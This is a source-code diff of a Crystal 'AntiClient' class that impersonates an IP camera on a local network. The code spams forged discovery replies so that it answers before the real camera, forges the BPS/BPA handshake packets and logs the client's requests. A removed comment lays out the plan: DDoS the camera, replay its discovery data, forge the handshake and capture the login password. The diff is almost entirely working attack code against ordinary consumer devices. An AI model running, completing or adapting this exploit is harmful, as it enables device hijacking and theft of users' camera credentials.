@@ -5,45 +5,19 @@ class AntiClient < Client
   STATES = [:nothing,
             :listen_for_client_dbp,
             :listen_for_camera_dbr,
-            :ddos_camera,
-            :wait_for_client_dbp,
-            :send_dbr,
-            :wait_for_client_bcp,
-            :send_bps,
-            :handle_bp_handshake,
+            :spam_dbr,
+            :listen_for_client_bcp,
+            :receive_bps,
+            :send_4_bpa,
             :main_phase,
             :closing,
             :closed]
 
-  # The destination address the camera sends to
-  DB_SOCK_CAMERA_SRC = Socket::IPAddress.new("0.0.0.0", 8600)
-
-  # Destination address for the DBR 
-  DB_SOCK_CAMERA_DST = Socket::IPAddress.new("255.255.255.255", 6801)
-
-  # Listening address for the f130 broadcast packet
-  BC_SOCK_CAMERA_SRC = Socket::IPAddress.new("0.0.0.0", 32108)
-
-  #BC_SOCK_CAMERA_DST IS UNKNOWN! We need to wait for a client to connect to us.
-
-  getter db_camera_sock = UDPSocket.new
-  getter db_client_sock = UDPSocket.new
-  getter bc_camera_sock = UDPSocket.new
   getter dbr = {} of Symbol => String
 
-  def setup_ports
-    super
-    
-    # Our socket for recieving discovery broadcasts and sending DBRs
-    @db_camera_sock = UDPSocket.new
-    @db_camera_sock.bind DB_SOCK_CAMERA_SRC
-    @db_camera_sock.setsockopt LibC::SO_BROADCAST, 1
+  getter camera = Socket::IPAddress.new("0.0.0.0", 0)
 
-
-    @bc_camera_sock = UDPSocket.new
-    @bc_camera_sock.bind BC_SOCK_CAMERA_SRC
-    @bc_camera_sock.setsockopt LibC::SO_BROADCAST, 1
-  end
+  @spam_dbr = false
 
   def run
     # Dont allow the client to run again!
@@ -60,6 +34,7 @@ class AntiClient < Client
   end
 
   def listen_for_client_dbp
+    # TODO: ADD TIMEOUTS!
     got_dbp = false
     LOG.info("Waiting to receive the DBP from a client")
     until got_dbp
@@ -70,125 +45,87 @@ class AntiClient < Client
   end
 
   def listen_for_camera_dbr
+    # TODO: ADD TIMEOUTS!
     got_dbr = false
     LOG.info("Waiting to receive the DBR from a camera")
     until got_dbr
       potential_dbr = @db_client_sock.receive
       LOG.info("Got a potential DBR from a client")
 
-      got_dbr = true if potential_dbr[0][0..3] == DBR_HEADER
+      
+      if potential_dbr[0][0..3] == DBR_HEADER
+        got_dbr = true 
+        @camera = potential_dbr[1]
+        LOG.info "GOT DBR TARGET #{@camera}"
+      end
     end
     if potential_dbr
       @dbr = Client.parse_dbr potential_dbr
       @dbr
     else
-      puts "idk what happened"
       nil
     end
   end
 
-  def ddos_camera
-    sleep 10
-  end
-
-  # Makes a DBR given a dbr_hash
-  def make_dbr(dbr_hash) : String
-    dbr = DBR_HEADER
-    # Need to ljust for \x00 padding
-    dbr += dbr_hash[:camera_ip].ljust(DBR_CAMERA_IP.size,"\x00"[0])
-    dbr += dbr_hash[:netmask].ljust(DBR_NETMASK.size,"\x00"[0])
-    dbr += dbr_hash[:gateway].ljust(DBR_GATEWAY.size,"\x00"[0])
-    dbr += dbr_hash[:dns1].ljust(DBR_DNS1.size,"\x00"[0])
-    dbr += dbr_hash[:dns2].ljust(DBR_DNS2.size,"\x00"[0])
-    dbr += dbr_hash[:mac_address].split(':').map {|byte| Helpers.u16_to_bytechars byte.to_i(16)}.join
-    hex_http_port = dbr_hash[:http_port].to_i.to_s(16).rjust(4, '0')
-    big_i = Helpers.u16_to_bytechars hex_http_port[0..1].to_i(16)
-    little_i = Helpers.u16_to_bytechars hex_http_port[2..3].to_i(16)
-    
-    dbr += little_i
-    dbr += big_i
-    dbr += dbr_hash[:uid].ljust(DBR_UID.size,"\x00"[0])
-    dbr += dbr_hash[:name].ljust(DBR_NAME.size,"\x00"[0])
-    dbr += dbr_hash[:ddns_ip].ljust(DBR_DDNS_IP.size,"\x00"[0])
-    dbr += dbr_hash[:unknown1] # Single byte
-    dbr += dbr_hash[:ddns_url].ljust(DBR_DDNS_URL.size,"\x00"[0])
-    dbr += dbr_hash[:sn].ljust(DBR_SN.size,"\x00"[0])
-    dbr += dbr_hash[:ddns_password].ljust(DBR_DDNS_PASSWORD.size,"\x00"[0])
-    #dbr += dbr_hash[:unknown2] # Single byte
-    #hex_dbr_port = dbr_hash[:port].to_i.to_s(16).rjust(4, 0)
-    #big_i = Helpers.u16_to_bytechars hex_dbr_port[0..1].to_i(16)
-    #littlei_ = Helpers.u16_to_bytechars hex_dbr_port[2..3].to_i(16)
-    #dbr += big_i
-    #dbr += little_i
-    #dbr += "\xff" * 4
-    dbr
-  end
-
-  def send_dbr(dbr_hash : Hash(Symbol, String))
-    dbr = make_dbr(dbr_hash)
-    send_dbr dbr
-  end
-
-  def send_dbr(dbr_string : String)
-    @db_camera_sock.send(dbr_string, DB_SOCK_CAMERA_DST)
-    #@db_camera_sock.send(dbr_string, target)
+  # We just need to get our DBR in before the camera.
+  def spam_dbr(dbr)
+    @spam_dbr = true
+    LOG.info "Spamming DBR!"
+    spam_fiber = spawn do
+      while @spam_dbr
+        begin
+          send_dbr(dbr)
+          sleep 0.000001
+        rescue e
+          LOG.info "SPAM DBR EXCEPTION #{e}"
+        end
+      end
+      LOG.info "Spamming DBR Finished!"
+    end
   end
 
   def listen_for_client_bcp
+    # TODO: ADD TIMEOUTS!
     got_bcp = false
     until got_bcp
       potential_bcp = @bc_camera_sock.receive
       if potential_bcp && potential_bcp[0] == BCP
         got_bcp = true
         new_target potential_bcp[1]
-        puts potential_bcp[1]
       end
     end
     got_bcp
   end
 
-  def make_bps(uid)
-    bps = BPS_HEADER
-    bps += uid[0x0..0x3]
-    bps += "\x00" * 5
-    uid2 = uid[0x4..0x9].to_i
-    bps += String.new(Bytes[(uid2 & 0xff0000) >> 16, (uid2 & 0xff00) >> 8, uid2 & 0xff])
-    bps += uid[0xa..0xf]
-    bps += "\x00"*3
-    bps
-  end
+  def wait_for_client_ping(timeout)
+    LOG.info "Waiting for client ping"
+    ping_channel = Channel(Bool).new
 
-  def send_bps(uid)
-    bps = make_bps uid
-    @data_sock.send(bps, target)
-  end
-
-  def receive_bps
-    got_bps = false
-    until got_bps
-      potential_bps = @data_channel.receive
-      puts potential_bps
-      if potential_bps[0][0..3] == BPS_HEADER
-        got_bps = true
+    main_fiber = spawn do
+      got_ping = false
+      until got_ping
+        potential_ping = @data_channel.receive
+        if potential_ping[0] == PING_PACKET
+          got_ping = true
+        elsif potential_ping[0] == UNBLOCK_FIBER_DATA
+          break
+        end
       end
+      ping_channel.send got_ping
     end
-    got_bps
-  end
 
-  def make_bpa(uid)
-    bpa = BPA_HEADER
-    bpa += uid[0x0..0x3]
-    bpa += "\x00" * 5
-    uid2 = uid[0x4..0x9].to_i
-    bpa += String.new(Bytes[(uid2 & 0xff0000) >> 16, (uid2 & 0xff00) >> 8, uid2 & 0xff])
-    bpa += uid[0xa..0xf]
-    bpa += "\x00"*3
-    bpa
-  end
+    timeout_fiber = spawn do
+      sleep timeout
+      unblock_data
+    end
 
-  def send_bpa(uid)
-    bpa = make_bpa uid
-    @data_sock.send(bpa, target)
+    got_ping = ping_channel.receive
+    if got_ping
+      LOG.info "PING SUCCESSFUL" 
+    else
+      LOG.info "PING UNSUCCESSFUL"
+    end
+    got_ping
   end
 
   def main_phase
@@ -201,7 +138,16 @@ class AntiClient < Client
     elsif data[0] == PONG_PACKET
       send_ping
     elsif data[0] == DISCONNECT_PACKET
-      LOG.info "RECEIVED DISCONNECT FROM CAMERA"
+      LOG.info "RECEIVED DISCONNECT FROM CLIENT"
+      change_state :spam
+    elsif data[0][0..2] == REPLY_HEADER
+      LOG.info "REPLY RECIEVED FROM CLIENT"
+    elsif data[0][0..3] == BPS_HEADER
+      LOG.info "BPS RECEIVED"
+    elsif data[0][0..2] == RESPONSE_HEADER
+      LOG.info "REQUEST RECEIVED FROM CLIENT #{data[0].size}"   
+      LOG.info "\n" + data[0][0x10..data[0].size]
+      send_reply
     # This is important! The data fiber will block, waiting for data to come through
     # So to exit the program, we just send the unblock data to the data socket to free it
     elsif data[0] == UNBLOCK_FIBER_DATA
@@ -219,55 +165,41 @@ class AntiClient < Client
       change_state :listen_for_camera_dbr
     elsif state == :listen_for_camera_dbr
       listen_for_camera_dbr
-      change_state(:ddos_camera)
-    elsif state == :ddos_camera
-      ddos_camera
-      change_state(:wait_for_client_dbp)
-    elsif state == :wait_for_client_dbp
-      listen_for_client_dbp
-      change_state :send_dbr
-    elsif state == :send_dbr
-      network_info = IfConfig.get[0]
-      @dbr[:camera_ip] = network_info.ipv4_address
-      @dbr[:mac_address] = network_info.mac_address
-      send_dbr @dbr
-      change_state :wait_for_client_bcp
-    elsif state == :wait_for_client_bcp
+      change_state :spam
+    elsif state == :spam
+      spam_dbr @dbr
+      change_state :listen_for_client_bcp
+    elsif state == :listen_for_client_bcp
       listen_for_client_bcp
-      sleep 1
       change_state :send_bps
     elsif state == :send_bps
       send_bps @dbr[:uid]
       change_state :receive_bps
     elsif state == :receive_bps
-      receive_bps
-      change_state :send_4_bpa
+      if receive_bps(5)
+        @spam_dbr = false
+        change_state :send_4_bpa
+      else
+        change_state :listen_for_client_bcp
+      end
     elsif state == :send_4_bpa
       send_bpa(@dbr[:uid])
       send_bpa(@dbr[:uid])
       send_bpa(@dbr[:uid])
       send_bpa(@dbr[:uid])
-      change_state :main_phase
+      send_pong
+
+      if wait_for_client_ping(5)
+        change_state :main_phase
+      else
+        change_state :spam
+      end
     elsif state == :main_phase
       main_phase
+    elsif state == :closing
+    elsif state == :closed
     else
       raise "THERE WAS A BAD IN TICK!"
     end
-  end
-
-  # Order of things
-  # 1. Wait for DBP from client (f130 from 8600) (client to 255.255.255.255)
-  # 2. Capture DBR from camera  (44480108 from 6801) (camera to 255.255.255.255)
-  #   - Get UID, change IP, MAC, and/or other info.
-  # 3. DDOS camera
-  # 4. Wait for new DBP from client
-  # 5. Replay DBR
-  # 6. Wait for BCP from client
-  # 7. Forge BPS to client
-  # 8. Wait for BPS from client
-  # 9. Forge BPA to client.
-  # 10. Main phase, ping pong, wait for a GET with login params.
-  # 11. Once we get password, send disconnect, and close server.
-
-  
+  end  
 end
